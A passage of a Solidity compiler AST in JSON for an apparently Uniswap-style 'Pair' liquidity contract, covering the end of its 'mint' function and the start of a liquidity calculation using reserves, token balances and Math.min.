																	"src": "6046:14:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 1498,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "mul",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 2267,
																"src": "6046:18:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																	"typeString": "function (uint256,uint256) pure returns (uint256)"
																}
															},
															"id": 1500,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "6046:28:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "6038:36:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 1502,
													"nodeType": "ExpressionStatement",
													"src": "6038:36:6"
												}
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 1505,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 2325,
																"src": "6134:3:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 1506,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "6134:10:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														{
															"argumentTypes": null,
															"id": 1507,
															"name": "amount0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1406,
															"src": "6146:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 1508,
															"name": "amount1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1413,
															"src": "6155:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1504,
														"name": "Mint",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															1078
														],
														"referencedDeclaration": 1078,
														"src": "6129:4:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_uint256_$_t_uint256_$returns$__$",
															"typeString": "function (address,uint256,uint256)"
														}
													},
													"id": 1509,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6129:34:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1510,
												"nodeType": "EmitStatement",
												"src": "6124:39:6"
											}
										]
									},
									"documentation": null,
									"id": 1512,
									"implemented": true,
									"kind": "function",
									"modifiers": [
										{
											"arguments": null,
											"id": 1372,
											"modifierName": {
												"argumentTypes": null,
												"id": 1371,
												"name": "lock",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 1006,
												"src": "4940:4:6",
												"typeDescriptions": {
													"typeIdentifier": "t_modifier$__$",
													"typeString": "modifier ()"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "4940:4:6"
										}
									],
									"name": "mint",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1370,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1369,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 1512,
												"src": "4919:10:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1368,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "4919:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4918:12:6"
									},
									"returnParameters": {
										"id": 1375,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1374,
												"name": "liquidity",
												"nodeType": "VariableDeclaration",
												"scope": 1512,
												"src": "4954:14:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1373,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "4954:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4953:16:6"
									},
									"scope": 2193,
									"src": "4905:1265:6",
									"stateMutability": "nonpayable",
									"superFunction": 807,
									"visibility": "external"
								},
								{
									"body": {
										"id": 1656,
										"nodeType": "Block",
										"src": "6348:1212:6",
										"statements": [
											{
												"assignments": [
													1522,
													1524,
													null
												],
												"declarations": [
													{
														"constant": false,
														"id": 1522,
														"name": "_reserve0",
														"nodeType": "VariableDeclaration",
														"scope": 1656,
														"src": "6359:17:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														},
														"typeName": {
															"id": 1521,
															"name": "uint112",
															"nodeType": "ElementaryTypeName",
															"src": "6359:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														"value": null,
														"visibility": "internal"
													},
													{
														"constant": false,
														"id": 1524,
														"name": "_reserve1",
														"nodeType": "VariableDeclaration",
														"scope": 1656,
														"src": "6378:17:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														},
														"typeName": {
															"id": 1523,
															"name": "uint112",
															"nodeType": "ElementaryTypeName",
															"src": "6378:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														"value": null,
														"visibility": "internal"
													},
													null
												],
												"id": 1527,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 1525,
														"name": "getReserves",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1028,
														"src": "6401:11:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_view$__$returns$_t_uint112_$_t_uint112_$_t_uint32_$",
															"typeString": "function () view returns (uint112,uint112,uint32)"
														}
													},
													"id": 1526,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6401:13:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_uint112_$_t_uint112_$_t_uint32_$",
														"typeString": "tuple(uint112,uint112,uint32)"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6358:56:6"
											},
											{
												"assignments": [
													1529
												],
												"declarations": [
													{
														"constant": false,
														"id": 1529,
														"name": "balance0",
														"nodeType": "VariableDeclaration",
														"scope": 1656,
														"src": "6439:13:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1528,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "6439:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1538,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1535,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2355,
																	"src": "6488:4:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_Pair_$2193",
																		"typeString": "contract Pair"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_Pair_$2193",
																		"typeString": "contract Pair"
																	}
																],
																"id": 1534,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "6480:7:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 1536,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "6480:13:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1531,
																	"name": "token0",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 968,
																	"src": "6462:6:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 1530,
																"name": "IERC20",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 533,
																"src": "6455:6:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IERC20_$533_$",
																	"typeString": "type(contract IERC20)"
																}
															},
															"id": 1532,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "6455:14:6",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IERC20_$533",
																"typeString": "contract IERC20"
															}
														},
														"id": 1533,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "balanceOf",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 494,
														"src": "6455:24:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
															"typeString": "function (address) view external returns (uint256)"
														}
													},
													"id": 1537,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6455:39:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6439:55:6"
											},
											{
												"assignments": [
													1540
												],
												"declarations": [
													{
														"constant": false,
														"id": 1540,
														"name": "balance1",
														"nodeType": "VariableDeclaration",
														"scope": 1656,
														"src": "6504:13:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1539,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "6504:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1549,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1546,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2355,
																	"src": "6553:4:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_Pair_$2193",
																		"typeString": "contract Pair"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_Pair_$2193",
																		"typeString": "contract Pair"
																	}
																],
																"id": 1545,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "6545:7:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 1547,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "6545:13:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1542,
																	"name": "token1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 970,
																	"src": "6527:6:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 1541,
																"name": "IERC20",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 533,
																"src": "6520:6:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IERC20_$533_$",
																	"typeString": "type(contract IERC20)"
																}
															},
															"id": 1543,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "6520:14:6",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IERC20_$533",
																"typeString": "contract IERC20"
															}
														},
														"id": 1544,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "balanceOf",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 494,
														"src": "6520:24:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
															"typeString": "function (address) view external returns (uint256)"
														}
													},
													"id": 1548,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6520:39:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6504:55:6"
											},
											{
												"assignments": [
													1551
												],
												"declarations": [
													{
														"constant": false,
														"id": 1551,
														"name": "amount0",
														"nodeType": "VariableDeclaration",
														"scope": 1656,
														"src": "6569:12:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1550,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "6569:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1556,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1554,
															"name": "_reserve0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1522,
															"src": "6597:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 1552,
															"name": "balance0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1529,
															"src": "6584:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"id": 1553,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "sub",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 2239,
														"src": "6584:12:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
															"typeString": "function (uint256,uint256) pure returns (uint256)"
														}
													},
													"id": 1555,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6584:23:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6569:38:6"
											},
											{
												"assignments": [
													1558
												],
												"declarations": [
													{
														"constant": false,
														"id": 1558,
														"name": "amount1",
														"nodeType": "VariableDeclaration",
														"scope": 1656,
														"src": "6617:12:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1557,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "6617:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1563,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1561,
															"name": "_reserve1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1524,
															"src": "6645:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 1559,
															"name": "balance1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1540,
															"src": "6632:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"id": 1560,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "sub",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 2239,
														"src": "6632:12:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
															"typeString": "function (uint256,uint256) pure returns (uint256)"
														}
													},
													"id": 1562,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6632:23:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6617:38:6"
											},
											{
												"assignments": [
													1565
												],
												"declarations": [
													{
														"constant": false,
														"id": 1565,
														"name": "feeOn",
														"nodeType": "VariableDeclaration",
														"scope": 1656,
														"src": "6666:10:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 1564,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "6666:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1570,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1567,
															"name": "_reserve0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1522,
															"src": "6688:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														{
															"argumentTypes": null,
															"id": 1568,
															"name": "_reserve1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1524,
															"src": "6699:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"id": 1566,
														"name": "_mintFee",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1367,
														"src": "6679:8:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_uint112_$_t_uint112_$returns$_t_bool_$",
															"typeString": "function (uint112,uint112) returns (bool)"
														}
													},
													"id": 1569,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6679:30:6",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6666:43:6"
											},
											{
												"assignments": [
													1572
												],
												"declarations": [
													{
														"constant": false,
														"id": 1572,
														"name": "_totalSupply",
														"nodeType": "VariableDeclaration",
														"scope": 1656,
														"src": "6719:17:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1571,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "6719:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1574,
												"initialValue": {
													"argumentTypes": null,
													"id": 1573,
													"name": "totalSupply",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 19,
													"src": "6739:11:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6719:31:6"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1577,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1575,
														"name": "_totalSupply",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1572,
														"src": "6842:12:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 1576,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "6858:1:6",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "6842:17:6",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"id": 1617,
													"nodeType": "Block",
													"src": "7068:169:6",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1615,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1599,
																	"name": "liquidity",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1519,
																	"src": "7082:9:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 1607,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"id": 1604,
																						"name": "_totalSupply",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1572,
																						"src": "7132:12:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					],
																					"expression": {
																						"argumentTypes": null,
																						"id": 1602,
																						"name": "amount0",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1551,
																						"src": "7120:7:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 1603,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"memberName": "mul",
																					"nodeType": "MemberAccess",
																					"referencedDeclaration": 2267,
																					"src": "7120:11:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																						"typeString": "function (uint256,uint256) pure returns (uint256)"
																					}
																				},
																				"id": 1605,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"kind": "functionCall",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "7120:25:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "/",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 1606,
																				"name": "_reserve0",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1522,
																				"src": "7148:9:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint112",
																					"typeString": "uint112"
																				}
																			},
																			"src": "7120:37:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 1613,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"id": 1610,
																						"name": "_totalSupply",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1572,
																						"src": "7187:12:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					],
																					"expression": {
																						"argumentTypes": null,
																						"id": 1608,
																						"name": "amount1",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1558,
																						"src": "7175:7:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 1609,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"memberName": "mul",
																					"nodeType": "MemberAccess",
																					"referencedDeclaration": 2267,
																					"src": "7175:11:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																						"typeString": "function (uint256,uint256) pure returns (uint256)"
																					}
																				},
																				"id": 1611,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"kind": "functionCall",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "7175:25:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "/",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 1612,
																				"name": "_reserve1",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1524,
																				"src": "7203:9:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint112",
																					"typeString": "uint112"
																				}
																			},
																			"src": "7175:37:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			{
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		],
																		"expression": {
																			"argumentTypes": null,
																			"id": 1600,
																			"name": "Math",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 928,
																			"src": "7094:4:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_contract$_Math_$928_$",
																				"typeString": "type(library Math)"
																			}
																		},
																		"id": 1601,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "min",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": 873,
																		"src": "7094:8:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$",
																			"typeString": "function (uint256,uint256) pure returns (uint256)"
																		}
																	},
																	"id": 1614,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "7094:132:6",
																	"typeDescriptions": {
